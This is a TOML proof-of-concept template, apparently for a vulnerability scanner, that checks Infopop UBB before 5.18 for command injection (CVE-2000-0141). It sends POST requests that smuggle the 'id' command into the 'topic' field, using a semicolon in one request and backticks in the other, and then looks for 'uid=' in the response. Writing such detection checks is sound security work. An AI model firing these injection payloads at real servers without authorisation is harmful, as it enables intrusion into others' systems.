[info]
author = "ave"
description = "Infopop Ultimate Bulletin Board (UBB) 在主题发布功能中，隐藏字段（topic hidden field）未经净化即传入系统 shell，攻击者通过构造包含 shell 元字符（如反引号、$()、; 等）的 POST 请求实现远程命令执行。影响 UBB 5.18 之前所有版本。"
id = "POC-AVE-2000-0408"
name = "Infopop UBB Topic Hidden Field Command Injection PoC"
severity = "critical"
tags = ["ave-2000-0408"]
vuln_id = [
    "CVE-2000-0141",
    "AVE-2000-0408",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/Ultimate.cgi"
protocol = "http"

[poc.requests.body]
content = "action=post&topic=test%3Bid%3B&message=test&ubb=limited"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/Ultimate.cgi"
protocol = "http"

[poc.requests.body]
content = "action=post&topic=`id`&message=test&ubb=limited"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]
